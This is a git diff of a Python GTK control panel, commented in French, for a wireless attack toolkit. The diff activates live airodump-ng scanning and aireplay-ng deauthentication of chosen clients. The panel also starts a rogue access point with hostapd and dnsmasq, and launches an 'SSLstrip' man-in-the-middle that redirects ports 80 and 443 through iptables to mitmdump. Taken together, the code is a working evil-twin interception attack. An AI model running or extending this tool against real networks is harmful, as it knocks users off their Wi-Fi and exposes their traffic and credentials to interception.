@@ -1,3 +1,6 @@
+## TODO REFACTO
+## Use only one list with process started_service dict not necessary
+
 import gi
 gi.require_version("Gtk", "3.0")
 from gi.repository import Gtk
@@ -13,14 +16,15 @@ from os import fdopen, remove
 
 process_list = []
 started_service = {"ap": False, "sslstrip" : False}
-#p = subprocess.Popen(['airodump-ng', 'wlan0mon', '-w from_py', '--output-format', 'csv'])
-#process_list.append('airodump-ng')
+p = subprocess.Popen(['airodump-ng', 'wlan0mon', '-w from_py', '--output-format', 'csv'])
+process_list.append('airodump-ng')
 
 ## Quick fix really dirty
 time.sleep(2)
 
+## Permet de charger la liste des AP, à partir d'un fichier airodump
 def get_ap():
-    csv_file = open('test2.csv', 'r') # When used with airodump add space at start
+    csv_file = open(' from_py.csv', 'r') # When used with airodump add space at start
     csv_file.readline() ## Ignore first line tricks
     csv_file.readline() ## Ignore second line
     reader = csv.reader(csv_file, delimiter=',')
@@ -34,10 +38,11 @@ def get_ap():
     csv_file.close()
     return AP_list
 
+## Permet de charger la liste des clients, à partir d'un fichier airodump
 def get_client():
     client_list = []
     printed = False
-    csv_file = open('test2.csv', 'r') # When used with airodump add space at start
+    csv_file = open(' from_py.csv', 'r') # When used with airodump add space at start
     values = csv_file.readlines()
     for line in values:
         try:
@@ -53,6 +58,7 @@ def get_client():
     csv_file.close()
     return client_list
 
+## Permet l'édition des fichiers de configuration
 def replace(file_path, pattern, subst):
     #Create temp file
     fh, abs_path = mkstemp()
@@ -70,6 +76,7 @@ def replace(file_path, pattern, subst):
     #Move new file
     move(abs_path, file_path)
 
+## Permet la récupération des valeurs depuis les fichiers de configuration.
 def read_value(file_path, pattern):
     with open(file_path) as ofile:
         for line in ofile:
@@ -80,11 +87,10 @@ def read_value(file_path, pattern):
 
 class SelectBSSIDWindow(Gtk.Window):
     def __init__(self):
-        Gtk.Window.__init__(self, title="BSSID Select")
+        Gtk.Window.__init__(self, title="Main Pannel")
 
-        ## Box
-        self.box = Gtk.Box(spacing=6)
-        self.add(self.box)
+        grid = Gtk.Grid()
+        self.add(grid)
         
         ## List Model AP
         self.AP_liststore_model = Gtk.ListStore(str, str, str)
@@ -97,6 +103,7 @@ class SelectBSSIDWindow(Gtk.Window):
         self.treeview_ap = Gtk.TreeView(model=self.AP_liststore_model)
         ## Scrollable Window
         self.scrollable_treeview_ap = Gtk.ScrolledWindow()
+        self.scrollable_treeview_ap.set_property("width-request", 400)
         self.scrollable_treeview_ap.add(self.treeview_ap)
         ## Render text
         self.renderer_text = Gtk.CellRendererText()
@@ -109,7 +116,7 @@ class SelectBSSIDWindow(Gtk.Window):
         self.treeview_ap.append_column(self.column_bssid_channel)
         self.treeview_ap.append_column(self.column_apname)
         ## Add scrollable Window to box
-        self.box.pack_start(self.scrollable_treeview_ap, True, True, 0)
+        grid.attach(self.scrollable_treeview_ap, 0, 0, 1, 1)
 
         ## List Model AP Client
         self.clientAP_liststore_model = Gtk.ListStore(str, str)
@@ -122,61 +129,88 @@ class SelectBSSIDWindow(Gtk.Window):
         self.treeview_client_ap = Gtk.TreeView(model=self.clientAP_liststore_model)
         self.scrollable_treeview_client = Gtk.ScrolledWindow()
         self.scrollable_treeview_client.add(self.treeview_client_ap)
+        self.scrollable_treeview_client.set_property("width-request", 300)
+        self.scrollable_treeview_client.set_property("height-request", 200)
         self.renderer_clients_text = Gtk.CellRendererText()
         self.column_client_SSID = Gtk.TreeViewColumn("ESSID", self.renderer_clients_text, text=0)
         self.column_client_BSSID = Gtk.TreeViewColumn("BSSID", self.renderer_clients_text, text=1)
         self.treeview_client_ap.append_column(self.column_client_SSID)
         self.treeview_client_ap.append_column(self.column_client_BSSID)
-        self.box.pack_start(self.scrollable_treeview_client, True, True, 0)
+        grid.attach(self.scrollable_treeview_client, 1, 0, 1, 1)
 
         ## Define refresh button
         self.button_bssid_refresh = Gtk.Button(label="Refresh")
         self.button_bssid_refresh.connect("clicked", self.on_button_refresh_clicked)
-        self.box.pack_start(self.button_bssid_refresh, True, True, 0)
+        grid.attach(self.button_bssid_refresh, 0, 1, 1, 1)
         
         ## Define deauth button
-        self.button_deauthclient = Gtk.Button(label="Deauth Clients")
+        self.button_deauthclient = Gtk.Button(label="Deauth Client")
         self.button_deauthclient.connect("clicked", self.on_button_deauth_clicked)
-        self.box.pack_start(self.button_deauthclient, True, True, 0)
+        grid.attach(self.button_deauthclient, 1, 1, 1, 1)
 
         ## Start fake AP
         self.button_fakeAP = Gtk.Button(label="Start/Stop fake AP")
         self.button_fakeAP.connect("clicked", self.on_fakeAP_clicked)
-        self.box.pack_start(self.button_fakeAP, True, True, 0)
-
+        grid.attach(self.button_fakeAP, 0, 4, 1, 1)
+        
         ## Start SSlstrip
         self.button_sslstrip = Gtk.Button(label="Start/Stop SSlstrip attack")
         self.button_sslstrip.connect("clicked", self.on_button_sslstrip_clicked)
-        self.box.pack_start(self.button_sslstrip, True, True, 0)
+        grid.attach(self.button_sslstrip, 1, 4, 1, 1)
 
         ## Listen interface name
         self.listen_interface_label = Gtk.Label(label="Nom interface pour l'AP")
-        self.box.pack_start(self.listen_interface_label, True, True, 0)
+        grid.attach(self.listen_interface_label, 0, 2, 1, 1)
         self.listen_interface_name = Gtk.Entry()
         self.interface_name = read_value('../conf/hostapd.conf', 'interface=')
         self.listen_interface_name.set_text(self.interface_name[:-1])
-        self.box.pack_start(self.listen_interface_name, True, True, 0)
+        grid.attach(self.listen_interface_name, 1, 2, 1, 1)
 
         ## SSID name
         self.ssid_name_label = Gtk.Label(label="Nom de l'AP")
-        self.box.pack_start(self.ssid_name_label, True, True, 0)
+        grid.attach(self.ssid_name_label, 2, 2, 1, 1)
         self.ssid_name_entry = Gtk.Entry()
         self.ssid_name = read_value('../conf/hostapd.conf', 'ssid=')
         self.ssid_name_entry.set_text(self.ssid_name[:-1])
-        self.box.pack_start(self.ssid_name_entry, True, True, 0)
+        grid.attach(self.ssid_name_entry, 3, 2, 1, 1)
+
+        ## IP listen interface
+        self.listen_interfaceip_label = Gtk.Label(label="IP de l'interface pour l'AP")
+        grid.attach(self.listen_interfaceip_label, 2, 3, 1, 1)
+        self.listen_interface_ip = Gtk.Entry()
+        self.listen_interface_ip_value = read_value('../conf/config.sh', 'ip_interface=')
+        self.listen_interface_ip.set_text(self.listen_interface_ip_value[:-1])
+        grid.attach(self.listen_interface_ip, 3, 3, 1, 1)
+
+        ## Internet interface
+        self.internet_interface_label = Gtk.Label(label="Nom de l'interface vers internet")
+        grid.attach(self.internet_interface_label, 0, 3, 1, 1)
+        self.internet_interface = Gtk.Entry()
+        self.internet_interface_value = read_value('../conf/config.sh', 'internet_interface=')
+        self.internet_interface.set_text(self.internet_interface_value[:-1])
+        grid.attach(self.internet_interface, 1, 3, 1, 1)
+
+        ## IP range
+        self.range_ip_label = Gtk.Label(label="Range ip local")
+        grid.attach(self.range_ip_label, 2, 1, 1, 1)
+        self.range_ip = Gtk.Entry()
+        self.range_ip_value = read_value('../conf/dnsmasq.conf', 'dhcp-range=')
+        self.range_ip.set_text(self.range_ip_value[:-6])
+        grid.attach(self.range_ip, 3, 1, 2, 1)
 
         ## Define set value button
         self.button_set_value = Gtk.Button(label='Set value interface/name')
         self.button_set_value.connect("clicked", self.on_button_set_value_clicked)
-        self.box.pack_start(self.button_set_value, True, True, 0)
+        grid.attach(self.button_set_value, 4, 2, 1, 2)
 
         ## Define info button
         self.button_info = Gtk.Button(label='Info')
         self.button_info.connect("clicked", self.on_info_clicked)
-        self.box.pack_start(self.button_info, True, True, 0)
+        grid.attach(self.button_info, 4, 4, 1, 1)
 
     ######## Function
 
+    ## Permet d'actualiser la liste des APs et des clients a partir d'un fichier généré par airodump
     def on_button_refresh_clicked(self, widget):
         AP_list = get_ap()
         self.AP_liststore_model.clear()
@@ -188,18 +222,16 @@ class SelectBSSIDWindow(Gtk.Window):
         for client in client_list:
             self.clientAP_liststore_model.append(list(client))
 
-        print("Refresh BSSID/Client Liste")
-
+    ## Permet de deauth le client en fonction de l'AP et du client selectionné, il envoie 10 paquets de deauth
     def on_button_deauth_clicked(self, widget):
         selection_ap = self.treeview_ap.get_selection()
         model_ap, treeiter_ap = selection_ap.get_selected()
-        print (model_ap[treeiter_ap][0])
         if treeiter_ap is not None:
             for client in self.clientAP_list:
                 if client[1] == model_ap[treeiter_ap][0]:
-                    print ("True")
-                    #subprocess.Popen(['aireplay-ng', '--deauth', '10', '-a', model_ap[treeiter_ap][0], '-c', client[0], 'wlan0mon', '-D'])
+                    subprocess.Popen(['aireplay-ng', '--deauth', '10', '-a', model_ap[treeiter_ap][0], '-c', client[0], 'wlan0mon', '-D'])
 
+    ## Permet de lancer/d'arrêter le service hostapd ainsi que dnsmasq
     def on_fakeAP_clicked(self, widget):
         if not started_service['ap']:
             config_system = subprocess.run(["/bin/bash",'../conf/config.sh'])
@@ -218,6 +250,7 @@ class SelectBSSIDWindow(Gtk.Window):
             time.sleep(0.5)
             started_service['ap'] = False
 
+    ## Permet de lancer/arrêter mitmdump
     def on_button_sslstrip_clicked(self, widget):
         if not started_service['sslstrip']:
             forward = subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', self.listen_interface_name.get_text(), '-p', 'tcp', '--match', 'multiport', '--dports 80,443', '-j REDIRECT', '--to-port', '8080'])
@@ -230,11 +263,23 @@ class SelectBSSIDWindow(Gtk.Window):
             process_list.remove('mitmdump')
             started_service['sslstrip'] = False
 
+    ## Permet de set les valeurs dans les différents fichiers de conf
     def on_button_set_value_clicked(self, widget):
         replace('../conf/hostapd.conf', 'interface=', self.listen_interface_name.get_text())
         replace('../conf/hostapd.conf', 'ssid=', self.ssid_name_entry.get_text())
         replace('../conf/dnsmasq.conf', 'interface=', self.listen_interface_name.get_text())
+        replace('../conf/config.sh', 'ip_interface=', self.listen_interface_ip.get_text())
+        replace('../conf/config.sh', 'ap_interface_name=', self.listen_interface_name.get_text())
+        replace('../conf/config.sh', 'internet_interface=', self.internet_interface.get_text())
+        replace('../conf/stop_config.sh', 'ip_interface=', self.listen_interface_ip.get_text())
+        replace('../conf/stop_config.sh', 'ap_interface_name=', self.listen_interface_name.get_text())
+        replace('../conf/stop_config.sh', 'internet_interface=', self.internet_interface.get_text())
+        self.value_dhcp_range = self.range_ip.get_text() + ', 12h'
+        replace('../conf/dnsmasq.conf', 'dhcp-range=', self.value_dhcp_range)
+        self.gateway_value = self.listen_interface_ip.get_text()[:-3]
+        replace('../conf/dnsmasq.conf', 'dhcp-option=3,', self.gateway_value)
 
+    ## Permet de savoir si l'hostapd ainsi que dnsmasq sont lancés
     def on_info_clicked(self, widget):
         dialog = Gtk.MessageDialog(
             transient_for=self,
